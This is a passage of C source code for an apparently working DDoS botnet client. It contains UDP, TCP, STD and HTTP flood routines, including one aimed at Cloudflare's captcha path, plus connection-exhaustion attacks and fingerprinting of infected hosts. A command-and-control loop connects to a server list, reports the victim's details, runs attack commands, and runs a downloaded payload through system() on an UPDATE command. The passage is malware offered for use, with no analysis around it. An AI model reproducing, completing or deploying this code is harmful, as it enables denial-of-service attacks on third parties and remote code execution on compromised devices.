                                     "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94",
                                     "/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
                                     "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
                                    };
                if (a >= 50)
                {
                        send(std_hex, hexstring, std_packets, 0);
                        connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(std_hex);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}
void acnc(unsigned char *ip,int port, int end_time)
{
        int end = time(NULL) + end_time;
        int sockfd;
        struct sockaddr_in server;
        
        server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
        
        while(end > time(NULL))
        {
                sockfd = socket(AF_INET, SOCK_STREAM, 0);
                connect(sockfd , (struct sockaddr *)&server , sizeof(server));
                sleep(1);
                close(sockfd);
        }
        
}

int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}

void SendHTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1];
    for (i = 0; i < power; i++) {
        sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, host, useragents[(rand() % 59)]);
        if (fork()) {
            while (end > time(NULL)) {
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            _exit(0);
        }
    }
}
     
void SendHTTPCloudflare(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1];
    for (i = 0; i < power; i++) {
        sprintf(request, "%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, host, useragents[(rand() % 59)]);
        if (fork()) {
            while (end > time(NULL)) {
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            _exit(0);
        }
    }
}

void ahold(unsigned char *ip, int port, int end_time)
{

        int max = getdtablesize() / 2, i;

        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(ip, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        struct state_t
        {
                int fd;
                uint8_t state;
        } fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));

        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt, res;

        unsigned char *watwat = malloc(1024);
        memset(watwat, 0, 1024);

        int end = time(NULL) + end_time;
        while(end > time(NULL))
        {
                for(i = 0; i < max; i++)
                {
                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                                        else fds[i].state = 1;
                                }
                                break;

                        case 1:
                                {
                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                                        if(res == 1)
                                        {
                                                lon = sizeof(int);
                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                                if(valopt)
                                                {
                                                        close(fds[i].fd);
                                                        fds[i].state = 0;
                                                } else {
                                                        fds[i].state = 2;
                                                }
                                        } else if(res == -1)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;

                        case 2:
                                {
                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
                                        if(res != 0)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;
                        }
                }
        }
}
char *getArch() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "Arm4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "Arm5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "Arm6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "Arm7";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "Mips";
    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "Mipsel";
    #elif defined(__sh__)
    return "Sh4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "Ppc";
    #elif defined(__sparc__) || defined(__sparc)
    return "spc";
    #elif defined(__m68k__)
    return "M68k";
    #elif defined(__arc__)
    return "Arc";
    #else
    return "Unknown Architecture";
    #endif
}
char *getFiles()
{
        if(access("/usr/bin/python", F_OK) != -1){
        return "Python";
        }
        if(access("/usr/bin/python3", F_OK) != -1){
        return "Python3";
        }
        if(access("/usr/bin/perl", F_OK) != -1){
        return "Perl";
                } else {
        return "Unknown File";
        }
}
char *getDevice()
{
        if(access("usr/sbin/telnetd", F_OK) != -1){
        return "SSH";
        } else {
        return "Unknown Device";
        }
}
char *getPortz()
{
        if(access("/usr/bin/python", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/python3", F_OK) != -1){
        return "22";
        }
        if(access("/usr/bin/perl", F_OK) != -1){
        return "22";
        }
        if(access("/usr/sbin/telnetd", F_OK) != -1){
        return "22";
        } else {
        return "Unknown Port";
        }
}
char *getDistro()
{
        if(access("/usr/bin/apt-get", F_OK) != -1){
        return "Ubuntu/Debian";
        }
        if(access("/usr/lib/portage", F_OK) != -1){
        return "Gentoo";
        }
        if(access("/usr/bin/yum", F_OK) != -1){
        return "REHL/Centos";
        }
        if(access("/var/lib/YaST2", F_OK) != -1){
        return "Open Suse";
        } else {
        return "Unknown Distro";
        }
}

void UpdateBins()
        {
        int pid;
        
        if ( (pid = fork()) == 0) {
        system(payload);
        sleep(20);
        } else { 
        printf("%d\n", pid);
        }
        
        return;
        }

void processCmd(int argc, unsigned char *argv[])
{
        if(!strcmp(argv[0], "UDP"))
        {
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                int packetsize = atoi(argv[5]);
                int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        audp(ip, port, time, spoofed, packetsize, pollinterval);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }
                        audp(ip, port, time, spoofed, packetsize, pollinterval);
                        close(mainCommSock);

                        _exit(0);
                }
        }
        if(!strcmp(argv[0], "STD"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        astd(ip, port, time);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }
                        astd(ip, port, time);
                        _exit(0);
                }
        }        
        if(!strcmp(argv[0], "TCP"))
        {
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                unsigned char *flags = argv[5];

                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
                int packetsize = argc > 6 ? atoi(argv[6]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }
                        atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
                        close(mainCommSock);

                        _exit(0);
                }
        }

        if (!strcmp(argv[0], "CLOUDFLARE"))
        {
            if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
            if (listFork()) return;
            SendHTTPCloudflare(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
            _exit(0);
        }

        if (!strcmp(argv[0], "HTTP"))
        {
            if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
            if (listFork()) return;
            SendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
            _exit(0);
        }

        if(!strcmp(argv[0], "UPDATE"))
        {
        sockprintf(mainCommSock, "UPDATE TAKEN SUCCESFULLY");
        UpdateBins(1);
        return;
        }

        if(!strcmp(argv[0], "STOMP"))
        {
        if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char *flags = argv[5];
                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int packetsize = argc > 6 ? atoi(argv[6]) : 0;
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *ip = strtok(ip, ",");
            while(ip != NULL)
            {
                                if(!listFork())
                                {
                                        astd(ip, port, time);
                                        audp(ip, port, time, spoofed, packetsize, pollinterval);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else { 
                        if (listFork()) { return; }
                        astd(ip, port, time);
                        audp(ip, port, time, spoofed, packetsize, pollinterval);
                        close(mainCommSock);
                        _exit(0);
                }
        }
        if(!strcmp(argv[0], "RAID"))
        {
        if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char *flags = argv[5];
                int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int packetsize = argc > 6 ? atoi(argv[6]) : 0;
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *ip = strtok(ip, ",");
            while(ip != NULL)
            {
                                if(!listFork())
                                {
                                        astd(ip, port, time);
                                        atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else { 
                        if (listFork()) { return; }
                        astd(ip, port, time);
                        atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
                        close(mainCommSock);
                        _exit(0);
                }
        }                
        if(!strcmp(argv[0], "CNC"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        acnc(ip, port, time);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        acnc(ip, port, time);
                        _exit(0);
                }
        }
        if(!strcmp(argv[0], "HOME"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *ip = strtok(ip, ",");
                        while(ip != NULL)
                        {
                                if(!listFork())
                                {
                                        ahold(ip, port, time);
                                        astd(ip, port, time);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                ip = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        ahold(ip, port, time);
                        astd(ip, port, time);
                        _exit(0);
                }
        }
        if(!strcmp(argv[0], "STOP"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++) {
                        if (pids[i] != 0 && pids[i] != getpid()) {
                                kill(pids[i], 9);
                                killed++;
                        }
                }

                if(killed > 0)
                {
                } else {
                }
        }
}
int initConnection()
{
        unsigned char server[512];
        memset(server, 0, 512);
        if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, commServer[currentServer]);
        int port = 6982;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(mainCommSock, server, port, 30)) return 1;

        return 0;
}

int main(int argc, unsigned char *argv[])
{
        if(SERVER_LIST_SIZE <= 0) return 0;

        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        getOurIP();
        pid_t pid1;
        pid_t pid2;
        int status;

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        _exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        _exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
        setsid();
        chdir("/");
        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; }
                sockprintf(mainCommSock, "\x1b[1;97m[\x1b[0;31mTOO STRONG MY BOA\x1b[1;97m]\x1b[0;31m-->\x1b[1;97m[\x1b[0;31m%s\x1b[1;97m]\x1b[0;31m-->\x1b[1;97m[\x1b[0;31m%s\x1b[1;97m]\x1b[0;31m-->\x1b[1;97m[\x1b[0;31m%s\x1b[1;97m]\x1b[0;31m-->\x1b[1;97m[\x1b[0;31m%s\x1b[1;97m]\x1b[0;31m-->\x1b[1;97m[\x1b[0;31m%s\x1b[1;97m]\x1b[0;31m-->\x1b[1;97m[\x1b[0;31m%s\x1b[1;97m]", inet_ntoa(ourIP), getPortz(), getDevice(), getFiles(), getArch(), getDistro());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);
                        
                        unsigned char *message = commBuf;

                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                processCmd(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }

        return 0;
}
